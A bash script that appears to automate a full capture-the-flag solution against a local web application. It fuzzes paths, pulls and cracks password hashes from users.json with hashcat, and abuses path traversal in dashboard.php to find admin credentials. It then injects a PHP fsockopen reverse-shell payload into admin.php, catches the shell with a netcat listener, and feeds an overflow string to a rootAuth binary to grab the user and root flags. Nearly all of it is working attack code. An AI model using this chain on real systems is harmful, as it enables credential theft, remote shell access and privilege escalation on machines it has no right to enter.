#!/bin/bash

#region global variables
if [ -z "$1" ]; then
    IP="127.0.0.1"
else
    IP=$1
fi
if [ -z "$2" ]; then
    PORT="8080"
else
    PORT=$2
fi

URL="http://$IP:$PORT"
FILE_LIST="$(cat web_contents_dir.txt)"
PASSWORDS_LIST="passwords_dir.txt"
OUTPUT_FILE="valid_files.txt"
CREDS_FILE="credentials.txt"
VALID_CREDS_FILE="valid_credentials.txt"
VALID_USERS="valid_users.txt"
ADMIN_CREDS_FILE="admin_credentials.txt"
#endregion

echo "[+] Target: $URL"; echo;

#region fuzzing
echo "[+] Starting fuzzing ..."
> "$OUTPUT_FILE"
for file in $FILE_LIST; do 
    file=$(echo "$file" | tr -d '\r') 

    http_code=$(curl -s -o /dev/null -w "%{http_code}" "$URL/$file")

    if [[ "$http_code" -ne 404 ]]; then
        echo "$file" >> "$OUTPUT_FILE"
    fi
done

files=($(cat $OUTPUT_FILE))
echo "[+] Files discovered: [\"${files[@]// /\",\"}\"]"; echo;
#endregion

#region users.json password extraction
echo "[+] Geting all important data from \"users.json\" ..."
curl -s $URL/users.json | grep "username" | sed 's/.*"username": "\([^"]*\)".*/\1/' > users.txt
curl -s $URL/users.json | grep "password" | sed 's/.*"password": "\([^"]*\)".*/\1/' > hashes.txt

iterations=$(wc -l < users.txt)
for ((iter=1; iter<iterations+1; iter++)); do 
    echo $(sed -n "${iter}p" users.txt)":"$(sed -n "${iter}p" hashes.txt) >> $CREDS_FILE
done

echo "[+] Founded all this credentials y \"users.json\":"
cat $CREDS_FILE; echo
#endregion

#region valid users password
> $VALID_USERS
echo "[+] Getting valid credentials for the users, using hashcat ..."
> $VALID_CREDS_FILE
hashcat -m 100 -a 0 --show hashes.txt $PASSWORDS_LIST --outfile $VALID_CREDS_FILE > /dev/null 2>&1

for hash in `cat $CREDS_FILE`; do
    awk_hash=$(echo $hash | awk -F ':' '{printf $2}')
    for valid_hash in `cat $VALID_CREDS_FILE`; do
        awk_valid_hash=$(echo $valid_hash | awk -F ':' '{printf $1}')
        if [ $awk_hash == $awk_valid_hash ]; then
            echo $(echo $hash | awk -F ':' '{printf $1}')":"$(echo $valid_hash | awk -F ':' '{printf $2}') >> $VALID_USERS
        fi
    done
done 

echo "[+] Valid users:"
cat $VALID_USERS; echo
#endregion

#region geting admin json secretfile
echo "[+] Geting logged ..."
normal_user=$(head -n 1 $VALID_USERS | awk -F ':' '{printf $1}')
normal_password=$(head -n 1 $VALID_USERS | awk -F ':' '{printf $2}')
curl -s -c cookies.txt -d "username=$normal_user&password=$normal_password" -X POST "$URL/login.php"
echo "[+] Logged with $normal_user:$normal_password, generated cookies.txt"; echo

echo "[+] Exploting path traversal ..."
admin_file=$(curl -s -b cookies.txt "$URL/dashboard.php?dir=." | sed -n 's/.*\(admins[^"]*\).*/\1/p' | awk -F '</a>' '{printf $1}')
echo "[+] Founded: $admin_file"; echo
#endregion

#region users.json password extraction
echo "[+] Geting all important data from \"$admin_file\" ..."
> $ADMIN_CREDS_FILE
curl -s $URL/$admin_file | grep "username" | sed 's/.*"username": "\([^"]*\)".*/\1/' > aux_users.txt
curl -s $URL/$admin_file | grep "username" | sed 's/.*"username": "\([^"]*\)".*/\1/' >> users.txt
curl -s $URL/$admin_file | grep "password" | sed 's/.*"password": "\([^"]*\)".*/\1/' > hashes.txt

iterations=$(wc -l < aux_users.txt)
for ((iter=1; iter<iterations+1; iter++)); do 
    echo $(sed -n "${iter}p" aux_users.txt)":"$(sed -n "${iter}p"  hashes.txt) >> $ADMIN_CREDS_FILE
done

echo "[+] Founded all this credentials y \"$admin_file\":"
cat $ADMIN_CREDS_FILE; echo
#endregion

#region valid admins password
echo "[+] Getting valid credentials for the admins, using hashcat ..."

hashcat -m 100 -a 0 --show hashes.txt $PASSWORDS_LIST --outfile $VALID_CREDS_FILE > /dev/null 2>&1

for hash in `cat $ADMIN_CREDS_FILE`; do
    awk_hash=$(echo $hash | awk -F ':' '{printf $2}')
    for valid_hash in `cat $VALID_CREDS_FILE`; do
        awk_valid_hash=$(echo $valid_hash | awk -F ':' '{printf $1}')
        if [ $awk_hash == $awk_valid_hash ]; then
            echo $(echo $hash | awk -F ':' '{printf $1}')":"$(echo $valid_hash | awk -F ':' '{printf $2}') >> $VALID_USERS
            echo $(echo $hash | awk -F ':' '{printf $1}')":"$(echo $valid_hash | awk -F ':' '{printf $2}') >> admins.txt
        fi
    done
done 

echo "[+] Valid admins:"
cat admins.txt; echo
#endregion

#region getting flags
echo "[+] Building reverse shell ..."
echo "[+] Exploding Buffer Overflow with 111111111111111111111111111111111111111111111111111111111111111111111111 ..."
REVERSE_IP=$(hostname -I | awk '{printf $1}')
REVERSE_PORT="4444"

{
    echo "cd /home/www-data"
    echo "cat user.txt"
    echo "echo '111111111111111111111111111111111111111111111111111111111111111111111111'| ./rootAuth"
    echo "exit"
} | nc -lvp $REVERSE_PORT > output.txt 2>&1 &

curl -c cookies.txt -d "username=monre&password=bluemonkey" -X POST "$URL/login.php" 

PAYLOAD="\$(php -r '\$sock=fsockopen(\"$REVERSE_IP\",$REVERSE_PORT);exec(\"/bin/sh -i <%263 >%263 2>%263\");')"
curl -s -b cookies.txt -d "username=johndoe&email=johndoe@example.com&phone=1234567890&address=123 Elm Street, Springfield $PAYLOAD&password=securepassword&submit=Save+New+User" -X POST "$URL/admin.php" &>/dev/null

echo;
echo "[+] User flag: $(cat output.txt | grep 'ssi' | awk 'NR==1' | awk '{printf $NF}')"
echo "[+] Root flag: $(cat output.txt | grep 'ssi' | awk 'NR==2' | awk '{printf $NF}')"

rm cookies.txt
rm output.txt
rm aux_users.txt
rm $ADMIN_CREDS_FILE
rm $CREDS_FILE
rm hashes.txt
rm $VALID_CREDS_FILE
#endregion